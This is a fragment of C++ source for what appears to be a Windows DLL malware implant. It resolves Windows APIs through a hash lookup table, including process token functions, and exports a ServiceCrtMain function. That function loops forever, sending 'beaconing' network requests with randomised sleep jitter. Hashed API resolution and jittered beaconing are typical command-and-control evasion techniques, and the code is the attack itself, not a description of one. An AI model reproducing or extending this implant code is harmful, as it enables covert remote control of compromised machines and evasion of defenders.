		hash_GetCurrentProcessId = (_GetCurrentProcessId)rtExampleTbl.reEntries[44].lpAddr;
		hash_OpenProcessToken = (_OpenProcessToken)rtExampleTbl.reEntries[45].lpAddr;
		hash_GetCurrentProcess = (_GetCurrentProcess)rtExampleTbl.reEntries[46].lpAddr;
		hash_GetTokenInformation = (_GetTokenInformation)rtExampleTbl.reEntries[47].lpAddr;
	}
}

extern "C" __declspec(dllexport)
void ServiceCrtMain()
{
	//Sleep(30000);

	srand(time(NULL));

	ApiHashLookup();

	std::string preparedData = beaconingRequestData();

	while (true)
	{
		// send perodic beaconing requests
		sendNetworkRequest(preparedData, FALSE);

		int randomSleep = 5000 + (rand() % 10000);

		Sleep(randomSleep);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}